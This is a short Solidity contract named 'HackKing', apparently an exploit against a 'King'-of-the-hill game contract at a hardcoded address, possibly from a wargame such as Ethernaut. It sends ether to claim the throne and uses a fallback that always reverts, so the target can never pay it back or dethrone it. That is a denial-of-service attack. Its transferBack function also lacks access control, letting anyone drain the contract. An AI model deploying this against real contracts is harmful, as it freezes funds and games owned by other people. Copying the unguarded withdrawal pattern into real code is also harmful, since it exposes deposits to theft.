pragma solidity ^0.4.18;

contract HackKing {
    
    address toHackAddress = 0xfb693e71bf02d76c6fd6229443d01023d906e9ad;

    function HackKing() payable public {}
    
    function() payable public {
        revert();
    }
    
    function transferBack(address _address){
        _address.transfer(address(this).balance);
    }
    
    function getBalance() view public returns (uint) {
        return address(this).balance;
    } 
    
    function RegisterAsKing() payable {
        toHackAddress.call.value(msg.value).gas(500000)();
    }
}